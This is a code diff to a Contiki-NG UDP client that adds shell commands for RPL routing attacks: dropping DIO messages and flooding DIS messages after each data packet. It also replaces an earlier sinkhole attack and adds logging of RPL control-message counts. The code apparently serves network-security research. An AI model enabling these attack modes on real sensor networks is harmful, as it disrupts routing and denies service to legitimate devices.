@@ -18,6 +18,8 @@
 #include <inttypes.h>
 
 #include "sys/log.h"
+
+#include "rpl.h"
 #define LOG_MODULE "App"
 #define LOG_LEVEL LOG_LEVEL_INFO
 
@@ -30,6 +32,9 @@
 
 static struct simple_udp_connection udp_conn;
 
+bool flooding_attack_send_dis = false;
+
+extern rpl_instance_t curr_instance;
 /*---------------------------------------------------------------------------*/
 PROCESS(udp_client_process, "UDP client");
 AUTOSTART_PROCESSES(&udp_client_process);
@@ -44,6 +49,8 @@ udp_rx_callback(struct simple_udp_connection *c,
          uint16_t datalen)
 {
   app_message_t *msg = (app_message_t *)data;
+  int8_t rssi = (int8_t)uipbuf_get_attr(UIPBUF_ATTR_RSSI);
+  
   LOG_INFO("Received ");
   if(datalen != sizeof(app_message_t)) {
     LOG_INFO_("unknown data of size %u from ", datalen);
@@ -51,6 +58,8 @@ udp_rx_callback(struct simple_udp_connection *c,
     LOG_INFO_("response %"PRIu32" from ", app_read_uint32(msg->seqno));
   }
   LOG_INFO_6ADDR(sender_addr);
+  
+  LOG_INFO_(", RSSI: (%d dBm)", rssi);
 #if LLSEC802154_CONF_ENABLED
   LOG_INFO_(" LLSEC LV:%d", uipbuf_get_attr(UIPBUF_ATTR_LLSEC_LEVEL));
 #endif
@@ -59,28 +68,39 @@ udp_rx_callback(struct simple_udp_connection *c,
 /*---------------------------------------------------------------------------*/
 /* Example shell command */
 static
-PT_THREAD(cmd_attack(struct pt *pt, shell_output_func output, char *args))
+PT_THREAD(cmd_dio_drop_attack(struct pt *pt, shell_output_func output, char *args))
 {
   PT_BEGIN(pt);
-  SHELL_OUTPUT(output, "SINK HOLE ATTACK IS STARTED!\n");
-  icmp6_stats_sink_hole = true;
-  icmp6_stats_drop_fwd_udp = true;
-  rpl_timers_dio_reset("SINK HOLE ATTACK IS STARTED!");
+  SHELL_OUTPUT(output, "FLOODING ATTACK IS STARTED!\n");
+  flooding_attack_drop_dio = true;
+  rpl_timers_dio_reset("FLOODING ATTACK IS STARTED!");
   PT_END(pt);
 }
+
+static
+PT_THREAD(cmd_dis_repeat_attack(struct pt *pt, shell_output_func output, char *args))
+{
+  PT_BEGIN(pt);
+  SHELL_OUTPUT(output, "FLOODING ATTACK IS STARTED!\n");
+  flooding_attack_send_dis = true; // Used for sending dis packet even after joining the DODAG
+  rpl_timers_dio_reset("FLOODING ATTACK IS STARTED!");
+  PT_END(pt);
+}
+
 static
 PT_THREAD(cmd_stop_attack(struct pt *pt, shell_output_func output, char *args))
 {
   PT_BEGIN(pt);
-  SHELL_OUTPUT(output, "SINK HOLE ATTACK IS FINISHED!\n");
-  icmp6_stats_sink_hole = false;
-  icmp6_stats_drop_fwd_udp = false;
-  rpl_timers_dio_reset("SINK HOLE ATTACK IS FINISHED!");
+  SHELL_OUTPUT(output, "FLOODING ATTACK IS FINISHED!\n");
+  flooding_attack_drop_dio = false;
+  flooding_attack_send_dis = false;
+  rpl_timers_dio_reset("FLOODING ATTACK IS FINISHED!");
   PT_END(pt);
 }
 /*---------------------------------------------------------------------------*/
 static const struct shell_command_t client_commands[] = {
-  { "attack", cmd_attack, "'> attack': Sets the node in attack mode." },
+  { "dio-drop-attack", cmd_dio_drop_attack, "'> attack': Sets the node in dio-drop attack mode." },
+  { "dis-repeat-attack", cmd_dis_repeat_attack, "'> attack': Sets the node in dis-repeat attack mode." },
   { "stop-attack", cmd_stop_attack, "'> attack': Sets the node in non-attack mode." },
   { NULL, NULL, NULL },
 };
@@ -100,6 +120,9 @@ to_seconds(uint64_t time)
 /*---------------------------------------------------------------------------*/
 PROCESS_THREAD(udp_client_process, ev, data)
 {
+
+  shell_command_set_register(&client_shell_command_set);
+
   static struct etimer periodic_timer;
   static uint32_t count;
   static app_message_t msg;
@@ -117,11 +140,34 @@ PROCESS_THREAD(udp_client_process, ev, data)
   simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                       UDP_SERVER_PORT, udp_rx_callback);
 
-  shell_command_set_register(&client_shell_command_set);
-
   etimer_set(&periodic_timer, random_rand() % SEND_INTERVAL);
   while(1) {
     PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
+    
+    default_instance = rpl_get_default_instance();
+    rank = default_instance ? default_instance->dag.rank : RPL_INFINITE_RANK;
+    dag_version = default_instance ? default_instance->dag.version : 0;
+    LOG_INFO("DATA: sq:%"PRIu32",rank:%3u,ver:%u",
+              count, rank, dag_version);
+    LOG_INFO_(",dis-ur:%"PRIu32",dis-mr:%"PRIu32,
+              icmp6_stats.dis_uc_recv, icmp6_stats.dis_mc_recv);
+    LOG_INFO_(",dis-us:%"PRIu32",dis-ms:%"PRIu32,
+              icmp6_stats.dis_uc_sent, icmp6_stats.dis_mc_sent);
+    LOG_INFO_(",dio-ur:%"PRIu32",dio-mr:%"PRIu32,
+              icmp6_stats.dio_uc_recv, icmp6_stats.dio_mc_recv);
+    LOG_INFO_(",dio-us:%"PRIu32",dio-ms:%"PRIu32,
+              icmp6_stats.dio_uc_sent, icmp6_stats.dio_mc_sent);
+    LOG_INFO_(",dao-r:%"PRIu32",dao-s:%"PRIu32,
+              icmp6_stats.dao_recv, icmp6_stats.dao_sent);
+    LOG_INFO_(",daoa-r:%"PRIu32",daoa-s:%"PRIu32,
+              icmp6_stats.dao_ack_recv, icmp6_stats.dao_ack_sent);
+    LOG_INFO_(",dio_intcurrent:%"PRIu32, (uint32_t)curr_instance.dag.dio_intcurrent);
+    LOG_INFO_(",dio_counter:%"PRIu32"\n", (uint32_t)curr_instance.dag.lifetime);
+
+    // LOG_INFO_(",dia-r:%"PRIu32",tots:%"PRIu32"\n",
+    //         icmp6_stats.dao_recv, icmp6_stats.rpl_total_sent);
+    // LOG_INFO_(",rssi:%"PRIu32,
+    //           cc2420_last_rssi);
 
     if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
       /* Send to DAG root */
@@ -131,21 +177,15 @@ PROCESS_THREAD(udp_client_process, ev, data)
       memset(&msg, 0, sizeof(msg));
       app_write_uint32(msg.seqno, count);
       default_instance = rpl_get_default_instance();
-      rank = default_instance ? default_instance->dag.rank : RPL_INFINITE_RANK;
-      dag_version = default_instance ? default_instance->dag.version : 0;
       app_write_uint16(msg.rpl_rank, default_instance->dag.rank);
-      LOG_INFO("DATA: sq:%"PRIu32",rank:%3u,ver:%u",
-               count, rank, dag_version);
-      LOG_INFO_(",disr:%"PRIu32",diss:%"PRIu32,
-                icmp6_stats.dis_uc_recv + icmp6_stats.dis_mc_recv,
-                icmp6_stats.dis_uc_sent + icmp6_stats.dis_mc_sent);
-      LOG_INFO_(",dior:%"PRIu32",dios:%"PRIu32,
-                icmp6_stats.dio_uc_recv + icmp6_stats.dio_mc_recv,
-                icmp6_stats.dio_uc_sent + icmp6_stats.dio_mc_sent);
-      LOG_INFO_(",diar:%"PRIu32",tots:%"PRIu32"\n",
-                icmp6_stats.dao_recv, icmp6_stats.rpl_total_sent);
+
       simple_udp_sendto(&udp_conn, &msg, sizeof(msg), &dest_ipaddr);
       count++;
+
+      // Naive dis-send right after a udp packet send
+      if(flooding_attack_send_dis){
+        rpl_icmp6_dis_output(NULL);
+      }
     } else {
       LOG_INFO("Not reachable yet\n");
     }
